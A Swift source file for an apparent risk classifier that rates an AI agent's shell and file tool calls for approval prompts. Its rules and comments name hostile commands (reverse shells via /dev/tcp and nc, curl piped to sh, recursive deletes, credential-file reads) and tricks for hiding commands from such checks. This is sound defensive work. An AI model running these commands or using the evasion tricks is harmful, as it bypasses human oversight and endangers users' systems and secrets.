import Foundation

/// A risk verdict with a human reason, replacing naive keyword matching.
public struct RiskAssessment: Sendable, Equatable {
    public let level: RiskLevel
    public let reason: String          // short human explanation, e.g. "recursive delete"
    public let alwaysDangerous: Bool   // passive-guardian: prompt even when auto-allowing
}

/// Parses what a tool actually wants to do and assigns risk + a reason.
///
/// Far more accurate than keyword matching: `rm file.txt` is amber, `rm -rf ~`
/// is red; `git push` to a branch is amber, `--force` to `main` is red; `curl
/// localhost` is calm, `curl … | sh` is red. `alwaysDangerous` marks the things
/// passive-guardian mode should *always* surface even while auto-allowing.
public enum RiskEngine {

    public static func assess(toolName: String?, event: HookEvent? = nil,
                              command: String? = nil, filePath: String? = nil,
                              cwd: String? = nil) -> RiskAssessment {
        let name = (toolName ?? "").lowercased()
        // Keep the full action after the server prefix (mcp__server__delete_file →
        // "delete_file"), not just the last underscore segment ("file"), so the
        // verb that drives risk classification isn't dropped.
        let bare = name.hasPrefix("mcp__") ? name.components(separatedBy: "__").dropFirst(2).joined(separator: "_") : name

        if name == "bash" || bare.contains("bash") || bare.contains("shell") {
            return assessCommand(command ?? event?.command ?? "")
        }
        // Severity order matters: a DESTRUCTIVE verb wins over a co-occurring PATH or read/write
        // verb — so a tool like `mcp__fs__delete_file` carrying {"path":…} is NOT downgraded to
        // .read by the filePath branch below and silently auto-allowed. This MUST precede the
        // filePath branch. (Mirrors ToolRisk.classify's destructive-before-read ordering.)
        // Match on WORD/`_` boundaries, not raw substring, so `select_dropdown` / `drag_and_drop` /
        // `Skill`(→kill) aren't mislabeled danger. "drop" is intentionally omitted (too ambiguous —
        // dropdown/backdrop; a dangerous SQL/DB `drop` is caught at the command level, not the name).
        let destructiveVerbs: Set<String> = ["delete", "remove", "destroy", "deploy", "publish", "kill"]
        let nameTokens = Set(bare.split(whereSeparator: { !$0.isLetter }).map(String.init))
        if !nameTokens.isDisjoint(with: destructiveVerbs) {
            return RiskAssessment(level: .danger, reason: "destructive action", alwaysDangerous: true)
        }
        if let path = filePath ?? event?.filePath {
            return assessFile(tool: bare, path: path, cwd: cwd ?? event?.cwd)
        }
        if bare.contains("fetch") || bare.contains("web") || bare.contains("http") {
            return RiskAssessment(level: .danger, reason: "network access", alwaysDangerous: false)
        }
        if bare.contains("write") || bare.contains("edit") || bare.contains("create") || bare.contains("update") {
            return RiskAssessment(level: .write, reason: "modifies a file", alwaysDangerous: false)
        }
        if bare.contains("read") || bare.contains("grep") || bare.contains("glob") || bare.contains("ls") || bare.contains("list") || bare.contains("search") {
            return RiskAssessment(level: .read, reason: "read-only", alwaysDangerous: false)
        }
        return RiskAssessment(level: .unknown, reason: "needs approval", alwaysDangerous: false)
    }

    // MARK: - Bash command parsing

    /// Transparent prefixes we step THROUGH to find the real command, so a
    /// dangerous command can't hide behind `time`/`env`/`sudo`/etc. or an
    /// env-assignment. (sudo/doas are stepped through AND flagged.)
    private static let wrappers: Set<String> = [
        "time", "nohup", "env", "xargs", "command", "exec", "builtin",
        "nice", "ionice", "stdbuf", "setsid", "timeout", "sudo", "doas",
    ]

    /// Binaries that execute a NESTED command we cannot statically see the risk of (a remote
    /// host, container, other session/process) — unlike `wrappers`, these are NOT transparent:
    /// the real dangerous verb after them is invisible to every leader-gated check below, so we
    /// treat invoking them at all as always-dangerous rather than trying to parse each one's
    /// distinct nested-command syntax (ssh's is "everything after the first non-flag arg",
    /// docker exec's is "everything after the container name", su's is after `-c`, etc.).
    /// docker/kubectl are deliberately NOT here — they have too many benign non-exec subcommands
    /// (ps/images/logs/get pods/...) to blanket-flag; they get their own narrower exec/destructive
    /// classification below instead.
    private static let opaqueExec: Set<String> = [
        "ssh", "su", "flock", "chroot", "screen", "tmux", "rsh", "rlogin",
        "script", "nsenter", "unshare", "expect", "gdb", "lldb", "strace", "dtrace",
    ]

    /// Rewrites `${IFS}` / `$IFS` word-separator references — including substring/offset/case
    /// forms like `${IFS:0:1}`, `${IFS: -1}`, `${IFS,,}` (a common tokenizer-bypass trick:
    /// `rm${IFS}-rf${IFS}~` has no real whitespace for a naive split to find) — to a real space,
    /// so every downstream regex/leader check sees the command the shell would actually run.
    /// Applied once, up front, before any other parsing.
    private static func normalizeSeparators(_ cmd: String) -> String {
        // Two disjoint alternatives, NOT one optional-everything pattern: the braced form
        // requires and consumes through a literal closing `}` (so `${IFS:0:1}`/`${IFS,,}` still
        // work); the bare form matches ONLY the 4-char `$ifs` token with no trailing consumption.
        // A single alternation-free `\$\{?ifs\b[^}]*\}?` previously let the greedy `[^}]*` run
        // unbounded whenever $ifs was used WITHOUT braces (the most common form), deleting the
        // rest of the statement instead of converting it to a space — e.g. `rm$IFS-rf$IFS~`
        // collapsed to `"rm "`, silently erasing the `-rf`/`~` the recursive-delete check needs.
        cmd.replacingOccurrences(of: #"\$\{ifs\b[^}]*\}|\$ifs\b"#, with: " ", options: .regularExpression)
    }

    /// Strips a `./` prefix, directory path, and versioned-interpreter suffix (`python3.11` →
    /// `python`) from a command-position token before it's tested against `wrappers`/`opaqueExec`/
    /// any leader set — so `/usr/bin/sudo`, `./sudo`, and `python3.11` all collapse to the same
    /// leader as a bare `sudo`/`python` invocation instead of silently missing every check.
    /// Also aliases distinct-binary-name variants to their canonical leader: `docker-compose`/
    /// `podman-compose` → `docker` (so the docker/kubectl danger branch still applies), and
    /// `nodejs` (Debian/Ubuntu's actual Node.js binary name) → `node`.
    private static func normalizeLeader(_ tok: String) -> String {
        let stripped = tok.hasPrefix("./") ? String(tok.dropFirst(2)) : tok
        let base = (stripped as NSString).lastPathComponent
        if base == "docker-compose" || base == "docker_compose" || base == "podman-compose" || base == "podman"
            || base == "nerdctl" || base == "crictl" { return "docker" }
        if base == "oc" { return "kubectl" }
        if base == "nodejs" { return "node" }
        if base.range(of: #"^(python|ruby|perl|php)[-_]?[0-9][0-9.]*$"#, options: .regularExpression) != nil {
            return String(base.prefix(while: { $0.isLetter }))
        }
        return base
    }

    /// The command-position tokens of each `;`/`&`/`|`/newline/subshell segment:
    /// every wrapper it passes through PLUS the first real command. Env-var
    /// assignments (FOO=bar) are skipped. Lets us detect `time rm`, `FOO=1 rm`,
    /// `  rm`, `(rm …)`, `sudo rm` — all the anchored-regex bypasses.
    private static func commandLeaders(_ cmd: String) -> Set<String> {
        var result: Set<String> = []
        for seg in cmd.split(whereSeparator: { ";&|\n`()".contains($0) }) {
            var passedWrapper = false
            for tok in shellTokens(seg) {
                if tok.range(of: #"^\w+=.*"#, options: .regularExpression) != nil { continue }  // env assignment (quote-aware — see shellTokens)
                let leaf = normalizeLeader(tok)   // path/version-stripped, so /usr/bin/sudo etc. still match
                if wrappers.contains(leaf) { result.insert(leaf); passedWrapper = true; continue }
                // A wrapper's OWN args (a flag, a numeric duration like `timeout 5`, a flag=val)
                // must be skipped so the real command after them is still detected — e.g.
                // `timeout 5 rm -rf ~` or `nice -n 10 rm …` would otherwise stop at "5"/"-n".
                if passedWrapper, tok.hasPrefix("-") || tok.range(of: #"^\d+$"#, options: .regularExpression) != nil { continue }
                result.insert(leaf)
                break   // reached the real command
            }
        }
        return result
    }

    /// Whitespace-splits a segment like `.split` but keeps a quoted span (`"a b"`, `'a b'`) as one
    /// token, so `FOO="a b" rm -rf ~` doesn't fracture into `["foo=\"a", "b\"", "rm", ...]` and
    /// mis-detect the trailing quote fragment as the leader instead of `rm`.
    private static func shellTokens(_ seg: Substring) -> [String] {
        var tokens: [String] = []
        var current = ""
        var quote: Character?
        for ch in seg {
            if let q = quote {
                current.append(ch)
                if ch == q { quote = nil }
            } else if ch == "\"" || ch == "'" {
                quote = ch
                current.append(ch)
            } else if ch == " " || ch == "\t" {
                if !current.isEmpty { tokens.append(current); current = "" }
            } else {
                current.append(ch)
            }
        }
        if !current.isEmpty { tokens.append(current) }
        return tokens
    }

    /// First quoted payload (for `bash -c "…"` → assess the inner command).
    /// First quoted payload BY POSITION (not by quote-char precedence) — so a decoy
    /// double-quoted token AFTER a single-quoted `-c` payload can't mask it.
    private static func quotedPayload(_ raw: String) -> String? {
        let opens: [(Character, String.Index)] = ["\"", "'"].compactMap { (q: Character) in
            raw.firstIndex(of: q).map { (q, $0) }
        }
        guard let (q, s) = opens.min(by: { $0.1 < $1.1 }),
              let e = raw[raw.index(after: s)...].firstIndex(of: q) else { return nil }
        return String(raw[raw.index(after: s)..<e])
    }

    /// EVERY quoted span in a string (defense-in-depth: assess them all, take the most
    /// severe, so no ordering trick can hide the real `-c` payload behind a decoy).
    private static func quotedPayloads(_ raw: String) -> [String] {
        var out: [String] = []
        var i = raw.startIndex
        while i < raw.endIndex {
            let c = raw[i]
            if c == "\"" || c == "'", let e = raw[raw.index(after: i)...].firstIndex(of: c) {
                out.append(String(raw[raw.index(after: i)..<e]))
                i = raw.index(after: e)
            } else { i = raw.index(after: i) }
        }
        return out
    }

    /// Split into top-level statements (`;`, `&&`, `||`, `&`, newline) and return the
    /// MOST SEVERE — pipelines (`a | b`) stay intact so "curl … | sh" is one statement.
    /// Prevents a benign segment ("curl localhost") from downgrading a dangerous one
    /// ("curl evil.com") in the same line, and stops substring checks from spanning
    /// unrelated statements (audit #3/#16).
    private static func assessCommand(_ raw: String, depth: Int = 0) -> RiskAssessment {
        // Collapse shell line-continuations (`\` immediately followed by a newline) BEFORE
        // splitting into statements — the real shell removes these and splices the straddling
        // token back together (even mid-word: `r\`+newline+`m -rf ~` really runs as `rm -rf ~`),
        // but splitStatements treats every raw `\n` as a hard statement boundary, so without this
        // the spliced command's leader is silently mangled into two harmless-looking halves.
        let joined = raw.replacingOccurrences(of: "\\\r\n", with: "").replacingOccurrences(of: "\\\n", with: "")
        let statements = splitStatements(joined)
        guard statements.count > 1 else { return assessStatement(joined, depth: depth) }
        return statements
            .map { assessStatement($0, depth: depth) }
            .max { a, b in a.level.rank != b.level.rank ? a.level.rank < b.level.rank
                                                        : (!a.alwaysDangerous && b.alwaysDangerous) }
            ?? assessStatement(joined, depth: depth)
    }

    private static func splitStatements(_ raw: String) -> [String] {
        var out: [String] = [], cur = ""
        let chars = Array(raw); var i = 0
        while i < chars.count {
            let c = chars[i]
            if c == ";" || c == "\n" { out.append(cur); cur = ""; i += 1; continue }
            if (c == "&" || c == "|"), i + 1 < chars.count, chars[i + 1] == c {  // && or ||
                out.append(cur); cur = ""; i += 2; continue
            }
            if c == "&" { out.append(cur); cur = ""; i += 1; continue }          // background; keep single | (pipeline)
            cur.append(c); i += 1
        }
        out.append(cur)
        return out.map { $0.trimmingCharacters(in: .whitespaces) }.filter { !$0.isEmpty }
    }

    /// The git SUBCOMMAND of a statement, skipping git's global options (`-C <path>`, `-c k=v`,
    /// `--git-dir …`, `--paginate`, …) so `git -C /r push --force` and `git -c k=v reset --hard`
    /// are still recognized. Contiguous-substring matching (`cmd.contains("git push")`) missed
    /// these and let a force-push / hard-reset fall through to "safe". nil if not a git command.
    private static func gitSubcommand(_ cmd: String) -> String? {
        let toks = cmd.split(whereSeparator: { $0 == " " || $0 == "\t" }).map(String.init)
        guard let gi = toks.firstIndex(of: "git") else { return nil }
        // git's value-taking global opts (each consumes the NEXT token). `cmd` is already lowercased
        // by the caller, so `-C` (change-dir) arrives as `-c` and is covered here too.
        let valueOpts: Set<String> = ["-c", "--git-dir", "--work-tree", "--namespace", "--exec-path", "--config-env"]
        var i = gi + 1
        while i < toks.count {
            let t = toks[i]
            if valueOpts.contains(t) { i += 2; continue }   // option + its separate value token
            if t.hasPrefix("-") { i += 1; continue }        // attached-value (--x=y) or bare flag
            return t                                        // first non-option token = the subcommand
        }
        return nil
    }

    private static func assessStatement(_ raw: String, depth: Int = 0) -> RiskAssessment {
        // Trimmed HERE (not just in splitStatements) so the single-statement path — which bypasses
        // splitStatements entirely and reassesses the raw `joined` string directly — also can't
        // keep a trailing \r (CRLF) that would make a suffix check like `cmd.hasSuffix(" /")` miss.
        let cmd = normalizeSeparators(raw.trimmingCharacters(in: .whitespacesAndNewlines).lowercased())
        let leaders = commandLeaders(cmd)

        // Opaque nested-command exec — ssh/docker/flock/kubectl/etc. hide whatever runs inside
        // them from every leader-gated check below (rm/sudo/eval/inline-script/…), so `ssh host
        // "rm -rf ~"` or `flock f rm -rf ~` would otherwise fall through to the default .read.
        if !leaders.isDisjoint(with: opaqueExec) {
            return red("runs a command inside another host/container/session (unauditable)", always: true)
        }

        // Pipe-to-shell/interpreter — the classic remote-exec footgun. A pipe into a shell or an
        // interpreter that runs stdin AS CODE executes arbitrary fetched/decoded code (curl|sh,
        // base64 -d|sh, curl x.py|python, …|node|ruby, bash -s). The negative lookaheads exclude the
        // interpreter processing stdin as DATA — `-m <module>`, `-l` (lint), or a script-file arg
        // (python -m json.tool, php -l, ruby foo.rb) — which are common and benign.
        // (?:[\w./-]*/)? allows a path-qualified interpreter (`/bin/bash`, `/usr/bin/python3`)
        // right after the pipe — a bare name-only match let `curl … | /bin/bash` slip through
        // since a literal `/` sat between `|` and the interpreter name. node(?:js)? also matches
        // `nodejs`, the actual Node.js binary name on Debian/Ubuntu. [\d.]* after the versioned
        // interpreters allows a glued-on version (python3.11). The (?=\s|$|[;&|<>)`'"]) terminator
        // (rather than a bare \b) requires the match to be the WHOLE final path component, not
        // just a prefix of it — a plain \b let `tools/sh-format.py` or `scripts/bash-lint.sh`
        // falsely match on the leading "sh"/"bash" substring of an unrelated script name. The
        // terminator class MUST include `)`/backtick/quotes, not just whitespace/`;&|<>` — command
        // substitution `$(curl x|sh)`, a bare subshell `(curl x|sh)`, and backtick substitution
        // both put a `)` or backtick immediately after the interpreter name, and omitting them from
        // the class let these extremely common shell idioms slip past entirely (a bare `\b` used
        // to catch this; tightening the terminator to fix the sh-format.py false positive
        // regressed it for these three idioms).
        if cmd.range(of: #"\|\s*(?:[\w./-]*/)?(sh|bash|zsh|dash|ksh|python3?[\d.]*|node(?:js)?|ruby[\d.]*|perl[\d.]*|php[\d.]*)(?=\s|$|[;&|<>)`'"])(?!\s+-(m|l)\b)(?!\s+[^\s|;&<>]*\.[a-z])"#, options: .regularExpression) != nil {
            return red("pipes into a shell/interpreter", always: true)
        }
        // Process substitution (`bash <(curl ...)`) feeds fetched/dynamic content into a shell or
        // interpreter exactly like a pipe does, without ever producing the literal `|` the check
        // above looks for. Leader-gated (via the already-normalized `leaders` set, which strips
        // paths/versions) rather than a bare substring regex — a plain `\b(sh|bash|...)\s+<\(`
        // matched any script merely ENDING in "sh"/"bash" before a process-substitution argument,
        // e.g. the common autoconf `install-sh <(diff a b)`, misclassifying the real command
        // (install-sh, not sh) as piping into a shell.
        let procSubInterpreters: Set<String> = ["sh", "bash", "zsh", "dash", "ksh", "source", "python", "python3", "node", "ruby", "perl", "php"]
        if !leaders.isDisjoint(with: procSubInterpreters), cmd.contains("<(") {
            return red("feeds a process substitution into a shell/interpreter (equivalent to piping into it)", always: true)
        }
        // Fork bomb / disk wipe.
        if cmd.contains(":(){") { return red("fork bomb", always: true) }
        if cmd.contains("mkfs") || cmd.range(of: #"\bdd\b.*of="#, options: .regularExpression) != nil {
            return red("writes raw disk", always: true)
        }
        // Privilege escalation (wrapper-aware).
        if !leaders.isDisjoint(with: ["sudo", "doas"]) {
            return red("runs as root (sudo)", always: true)
        }
        // Inline code execution — can do anything, so always surface.
        if !leaders.isDisjoint(with: ["python", "python3", "node", "ruby", "perl", "osascript", "php"]),
           cmd.range(of: #"\s-(c|e)\b"#, options: .regularExpression) != nil
               || cmd.range(of: #"\s--eval\b"#, options: .regularExpression) != nil
               || (leaders.contains("php") && cmd.range(of: #"\s-r\b"#, options: .regularExpression) != nil) {
            return red("runs an inline script", always: true)
        }
        if leaders.contains("eval") { return red("evaluates a dynamic command", always: true) }
        if !leaders.isDisjoint(with: ["nc", "ncat", "socat"]),
           cmd.range(of: #"\s-e\b"#, options: .regularExpression) != nil || cmd.contains(" exec") {
            return red("opens a reverse shell", always: true)
        }
        if leaders.contains("crontab") { return red("edits scheduled jobs", always: true) }
        if leaders.contains("launchctl"), cmd.range(of: #"\b(load|bootstrap|enable|submit)\b"#, options: .regularExpression) != nil {
            return red("loads a launch agent", always: true)
        }
        // Shell -c "<payload>": assess the wrapped command itself. Assess EVERY quoted span
        // (not just the first) and take the MOST severe, so a decoy quote can't mask the real
        // payload (e.g. `bash -c 'rm -rf ~' "ok"` must not be judged by "ok").
        if depth < 3, !leaders.isDisjoint(with: ["bash", "sh", "zsh", "dash", "ksh"]),
           cmd.split(whereSeparator: { $0 == " " || $0 == "\t" }).contains(where: { tok in
               tok.hasPrefix("-") && !tok.hasPrefix("--") && tok.contains("c")
           }) {
            let spans = quotedPayloads(raw)
            if !spans.isEmpty {
                let assessed = spans.map { assessCommand($0, depth: depth + 1) }
                return assessed.max { a, b in a.level.rank != b.level.rank ? a.level.rank < b.level.rank
                                                                           : (!a.alwaysDangerous && b.alwaysDangerous) }
                    ?? assessed[0]
            }
        }
        // rm — depends on recursion + target breadth.
        if leaders.contains("rm") {
            let recursive = cmd.range(of: #"\brm\b[^;&|]*\s-\w*[rf]"#, options: .regularExpression) != nil
            let broadTarget = cmd.contains(" / ") || cmd.hasSuffix(" /") || cmd.contains(" ~") || cmd.contains("/*") || cmd.contains("$home") || cmd.contains("${home")
            if recursive && broadTarget { return red("recursive delete of a broad path", always: true) }
            if recursive { return red("recursive delete", always: true) }
            return amber("deletes a file")
        }
        // git push — force to a protected branch is the scary one. (subcommand-aware so a global
        // option like `git -C /r push --force` can't slip past a contiguous-substring check.)
        let gitSub = gitSubcommand(cmd)
        if gitSub == "push" {
            // Force = --force / --force-with-lease / -f / a `+refspec` (anchored to a token
            // start, so a stray '+' elsewhere — e.g. "c++-rewrite" — isn't a false positive).
            let force = cmd.contains("--force") || cmd.contains("--force-with-lease")
                || cmd.range(of: #"\s-f(\s|$)"#, options: .regularExpression) != nil
                || cmd.range(of: #"(^|\s)\+[\w./-]+"#, options: .regularExpression) != nil
            // Deletes = --delete/-d, or an empty-source colon refspec (`git push origin :main`) —
            // removes the ref on the remote outright, at least as destructive as a force-push.
            let deletes = cmd.range(of: #"\s--delete\b"#, options: .regularExpression) != nil
                || cmd.range(of: #"\s-d(\s|$)"#, options: .regularExpression) != nil
                || cmd.range(of: #"(^|\s):[\w./-]+"#, options: .regularExpression) != nil
            // Protected = a WHOLE ref token equal to a protected branch (so "prod-spike" or
            // "maintenance" don't match), checking the destination of a src:dst refspec too.
            let protectedRefs: Set<String> = ["main", "master", "prod", "production", "release"]
            let refTokens = cmd.split(whereSeparator: { " \t".contains($0) })
                .map(String.init).filter { !$0.hasPrefix("-") && $0 != "git" && $0 != "push" }
                .flatMap { tok -> [String] in
                    let t = tok.hasPrefix("+") ? String(tok.dropFirst()) : tok
                    let parts = t.split(separator: ":").map(String.init)
                    return parts.map { ($0 as NSString).lastPathComponent }   // refs/heads/main → main
                }
            let protected = refTokens.contains { protectedRefs.contains($0) }
            if (force || deletes) && protected { return red("force-push / deletes a protected branch", always: true) }
            if force { return red("force-push") }
            if deletes { return red("deletes a remote branch/ref") }
            return amber("pushes to a remote")
        }
        if (gitSub == "reset" && cmd.contains("--hard")) || gitSub == "clean" { return red("discards uncommitted work") }
        // Container / cluster destructive actions — docker/kubectl have no git-style safety net,
        // so a delete/prune/rm can irreversibly wipe containers, images, volumes, or workloads.
        if !leaders.isDisjoint(with: ["docker", "kubectl"]) {
            // exec/run/attach/debug hide an arbitrary nested command or interactive session the
            // same way ssh does — genuinely opaque, unlike docker/kubectl's many benign
            // subcommands (ps/images/logs/get pods/...), which is why docker/kubectl aren't in
            // the blanket opaqueExec set above.
            // rsh: OpenShift's `oc rsh <pod>` opens a remote shell in a pod's container — same
            // opaque-nested-session risk as exec/attach, just under oc's own subcommand name.
            if cmd.range(of: #"\b(exec|run|attach|debug|rsh)\b"#, options: .regularExpression) != nil {
                return red("runs a command inside another host/container/session (unauditable)", always: true)
            }
            if cmd.range(of: #"\b(rm|rmi|prune|delete|drain|cordon)\b"#, options: .regularExpression) != nil
                || cmd.contains("compose down") {
                return red("removes containers/images/volumes/workloads", always: true)
            }
        }
        // System paths.
        if cmd.range(of: #">\s*/(etc|usr|bin|sbin|system|library)"#, options: .regularExpression) != nil
            || cmd.range(of: #"\b(chmod|chown)\b.*\s/(etc|usr|bin|sbin|system)"#, options: .regularExpression) != nil {
            return red("touches a system path")
        }
        // Reverse shell via bash's network pseudo-device (e.g. `bash -i >& /dev/tcp/host/port`).
        if cmd.contains("/dev/tcp/") || cmd.contains("/dev/udp/") {
            return red("opens a network socket (reverse shell)", always: true)
        }
        // World-writable / setuid permission change (777, a+w, o+w, +s) — privilege/persistence risk.
        if cmd.contains("chmod"), cmd.range(of: #"(777|\+s|a\+w|o\+w)"#, options: .regularExpression) != nil {
            return red("makes a file world-writable / setuid", always: true)
        }
        // Credential / persistence files (read OR write, via any utility or redirect) — checked
        // BEFORE the amber redirect/move rules so `echo x >> ~/.bashrc` isn't downgraded to .write
        // and auto-allowed in Autonomous. assessFile only guards the first-party File tools, so a
        // raw Bash `cat ~/.ssh/id_rsa` would otherwise fall through to .read. cmd is lowercased.
        if Self.touchesSensitivePath(cmd) {
            return red("touches a credential/persistence file", always: true)
        }
        // Process control / shutdown.
        if cmd.contains("killall") || cmd.contains("pkill") || cmd.range(of: #"(^|\s)kill\s+-9"#, options: .regularExpression) != nil {
            return red("kills processes")
        }
        if cmd.contains("shutdown") || cmd.contains("reboot") { return red("shuts down / reboots", always: true) }
        // Publishing / deploys.
        if cmd.contains("npm publish") || cmd.contains("pod trunk push") || cmd.contains("gh release create") {
            return red("publishes a release", always: true)
        }
        // Network egress (non-piped). Only treat as a calm "local request" when a
        // loopback host is the actual TARGET (host position) AND there's no external
        // http(s) URL — so "localhost" buried in a path/query of an external URL can't
        // downgrade a real egress.
        // Remote copy (scp/rsync/sftp) — ships local files/directories to a remote host over the
        // network exactly like curl --upload-file/-d @file; must not be rated below curl/wget.
        if !leaders.isDisjoint(with: ["scp", "rsync", "sftp"]) {
            if Self.touchesSensitivePath(cmd) {
                return red("copies a credential/persistence file to a remote host", always: true)
            }
            return amber("copies files to/from a remote host")
        }
        if cmd.contains("curl ") || cmd.contains("wget ") {
            let loopbackHost = cmd.range(of: #"(://|@|\s|=)(localhost|127\.0\.0\.1|0\.0\.0\.0|\[::1\])(:\d+)?([/\s"']|$)"#, options: .regularExpression) != nil
            let externalURL = cmd.range(of: #"https?://(?!localhost|127\.0\.0\.1|0\.0\.0\.0|\[::1\])"#, options: .regularExpression) != nil
            // Shipping a LOCAL FILE / body (-d @file, --data*@file, --upload-file, --form,
            // POST/PUT) is exfiltration even to a loopback target (the local service can forward
            // it), so it can't take the calm "local request" downgrade. cmd is already
            // lowercased, so match long flags + the @file marker (case-safe — curl's -F/-T/-d
            // collide with -f/-t case-folded).
            let sendsData = cmd.range(of: #"(--data\b|--data-[a-z]+\b|--upload-file\b|--form\b|--post-file\b|--post-data\b|--request\s+(post|put)|\s-d\s*@|=@|\s-t\s+\S|\$\(|`)"#, options: .regularExpression) != nil
            if loopbackHost && !externalURL && !sendsData {
                return RiskAssessment(level: .read, reason: "local request", alwaysDangerous: false)
            }
            return amber("network request")
        }
        // Package installs — worth a glance, not always-dangerous.
        if cmd.range(of: #"\b(npm|pnpm|yarn|brew|pip|pip3|gem|cargo)\b.*(install|add|uninstall)"#, options: .regularExpression) != nil {
            return amber("installs/removes packages")
        }
        // Mutating git / file moves.
        if ["commit", "merge", "rebase"].contains(gitSub ?? "") || cmd.contains("mv ") || cmd.contains("> ") {
            return amber("modifies files / history")
        }
        return RiskAssessment(level: .read, reason: "safe command", alwaysDangerous: false)
    }

    // MARK: - File tool parsing

    private static func assessFile(tool: String, path: String, cwd: String?) -> RiskAssessment {
        let p = (path as NSString).expandingTildeInPath
        let lower = p.lowercased()
        let inSystem = lower.hasPrefix("/etc") || lower.hasPrefix("/usr") || lower.hasPrefix("/system") || lower.hasPrefix("/library") || lower.hasPrefix("/private/etc")
        // Boundary-checked (not a bare hasPrefix), matching the underHome convention used below —
        // else a sibling directory sharing the cwd as a text prefix (cwd=/Users/bob/project,
        // path=/Users/bob/project-secrets/x) would wrongly read as "inWorkspace".
        let inWorkspace: Bool = cwd.map { c in
            let cw = (c as NSString).expandingTildeInPath
            return p == cw || p.hasPrefix(cw + "/")
        } ?? false
        let writing = tool.contains("write") || tool.contains("edit") || tool.contains("create")
            || tool.contains("move") || tool.contains("rename")   // move/rename mutate the filesystem

        // The irreversible 1% at the USER level: login/boot persistence, credentials, shell
        // init, and EdgePanel's own allowlist file. These expand to ~/Library/... or ~/.x and
        // do NOT match the root-anchored /library /etc checks above, so without this they'd be
        // a plain .write that Autonomous mode silently auto-allows. Writing them = persistence,
        // credential theft, or self-modifying the permission allowlist → always require a tap.
        let home = NSHomeDirectory().lowercased()
        // Boundary-aware: match the exact file (~/.zshrc), or dir contents / extensions
        // (~/.ssh/id_rsa, ~/.claude/settings.json) — but NOT a sibling like ~/.zshrc_backup
        // or ~/.ssh_notes which a bare hasPrefix would wrongly flag.
        func underHome(_ rel: String) -> Bool {
            let full = home + rel
            guard lower.hasPrefix(full) else { return false }
            if lower.count == full.count { return true }
            let next = lower[lower.index(lower.startIndex, offsetBy: full.count)]
            return next == "/" || next == "."
        }
        let sensitiveUser = underHome("/.ssh") || underHome("/.aws") || underHome("/.gnupg")
            || underHome("/library/launchagents") || underHome("/library/launchdaemons")
            || underHome("/.claude/settings") || underHome("/.zshrc") || underHome("/.zprofile") || underHome("/.zshenv")
            || underHome("/.bashrc") || underHome("/.bash_profile") || underHome("/.profile")
            || lower.hasPrefix("/private/var/at/tabs")

        if inSystem || sensitiveUser {
            // sensitiveUser is alwaysDangerous for BOTH read and write — READING ~/.ssh/id_rsa
            // or a credential file is exfiltration and must surface a tap even in Autonomous;
            // a system-file READ stays a (surfaced) danger but not always-dangerous.
            let reason = sensitiveUser ? (writing ? "writes a credential/persistence file" : "reads a credential/persistence file")
                                       : (writing ? "writes a system file" : "reads a system file")
            return RiskAssessment(level: .danger, reason: reason, alwaysDangerous: sensitiveUser || writing)
        }
        if writing {
            return RiskAssessment(level: .write, reason: inWorkspace ? "edits a project file" : "writes outside the workspace", alwaysDangerous: false)
        }
        return RiskAssessment(level: .read, reason: inWorkspace ? "reads a project file" : "reads outside the workspace", alwaysDangerous: false)
    }

    /// Does a (lowercased) shell command reference a credential / persistence file? Matches
    /// the same set assessFile guards — tilde, $HOME, and absolute-home forms — boundary-aware
    /// so a sibling like ~/.ssh_notes isn't flagged.
    private static func touchesSensitivePath(_ cmd: String) -> Bool {
        let home = NSHomeDirectory().lowercased()
        let rels = ["/.ssh", "/.aws", "/.gnupg", "/.claude/settings", "/.zshrc", "/.zprofile",
                    "/.zshenv", "/.bashrc", "/.bash_profile", "/.profile",
                    "/library/launchagents", "/library/launchdaemons"]
        func hit(_ rel: String) -> Bool {
            for base in ["~" + rel, "$home" + rel, "${home}" + rel, home + rel] {
                // Scan EVERY occurrence, not just the first: `cat ~/.sshx ~/.ssh/id_rsa` has a
                // decoy match (~/.sshx, non-boundary) before the real hit — stopping at the first
                // range(of:) would return false and miss the credential read entirely.
                var searchRange = cmd.startIndex..<cmd.endIndex
                while let r = cmd.range(of: base, range: searchRange) {
                    let after = cmd[r.upperBound...].first
                    if after == nil || after == "/" || after == "." || after == " " || after == "\"" || after == "'" { return true }
                    searchRange = r.upperBound..<cmd.endIndex
                }
            }
            return false
        }
        if rels.contains(where: hit) { return true }
        return cmd.range(of: #"(^|\s|=|"|')/(etc|private/etc|private/var/at/tabs)\b"#, options: .regularExpression) != nil
    }

    private static func red(_ reason: String, always: Bool = false) -> RiskAssessment {
        RiskAssessment(level: .danger, reason: reason, alwaysDangerous: always)
    }
    private static func amber(_ reason: String) -> RiskAssessment {
        RiskAssessment(level: .write, reason: reason, alwaysDangerous: false)
    }
}
